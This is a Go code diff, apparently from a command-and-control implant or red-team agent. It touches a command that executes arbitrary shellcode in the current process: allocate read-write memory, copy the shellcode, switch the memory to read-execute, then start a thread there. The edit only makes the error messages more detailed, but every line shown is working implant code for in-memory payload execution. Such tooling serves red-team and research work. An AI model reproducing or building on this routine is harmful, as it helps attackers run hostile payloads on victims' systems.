@@ -66,7 +66,7 @@ func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResu
 	// Step 1: Allocate RW memory
 	addr, err := injectAllocMemory(currentProcess, len(shellcode), PAGE_READWRITE)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("Error: failed to allocate memory for shellcode (%d bytes): %v", len(shellcode), err)
 	}
 
 	// Step 2: Copy shellcode (in-process, no API needed — more efficient than WriteProcessMemory)
@@ -75,13 +75,13 @@ func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResu
 
 	// Step 3: Change to RX (W^X enforcement)
 	if _, err := injectProtectMemory(currentProcess, addr, len(shellcode), PAGE_EXECUTE_READ); err != nil {
-		return errorf("Error: %v", err)
+		return errorf("Error: failed to change memory protection to RX at 0x%X: %v", addr, err)
 	}
 
 	// Step 4: Create thread
 	hThread, err := injectCreateRemoteThread(currentProcess, addr)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("Error: failed to create execution thread at 0x%X: %v", addr, err)
 	}
 	injectCloseHandle(hThread)
 
